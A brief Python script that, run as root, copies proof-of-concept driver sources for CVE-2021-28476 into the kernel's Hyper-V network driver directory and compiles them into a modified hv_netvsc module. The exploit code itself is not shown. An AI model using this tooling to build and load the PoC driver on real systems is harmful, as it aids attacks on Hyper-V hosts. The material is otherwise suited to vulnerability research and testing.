#!/usr/bin/python3
from os import *

def main():

    if getuid() != 0:
        print("[*] Run Only UID==ROOT")
        exit(-1)
    
    # init constants

    CVEDIR = "/home/poc/CVE-2021-28476/"
    POCSRC = CVEDIR + "src/"
    KVER = uname().release
    KDIR = "/lib/modules/" + KVER + "/build/"
    HV_NET_DRV_DIR = KDIR + "drivers/net/hyperv/"

    # copy to hyper-v network infrastructure drivers dir VSC
    files_poc= POCSRC+"*.h" + " " + POCSRC+"*.c"
    r = system("cp "+files_poc+" "+HV_NET_DRV_DIR)
    if r != 0:
        print("[-] Cannot Copy Source drivers files to kernel dir: ",strerror(r))
        exit(~r)

    print("[*] Complete copy hv_netvsc files to kernel dir")
    print("[*] Compiling...")

    r = system("make -C " + KDIR + " M=" + HV_NET_DRV_DIR)
    if r != 0:
        print("[-] Error Compile hv_netvsc driver files")
        exit(~r)
    print("[+] Complete Compile hv_netvsc\n[LOCATE_KO]: "+HV_NET_DRV_DIR)

if __name__ == "__main__":
    main()
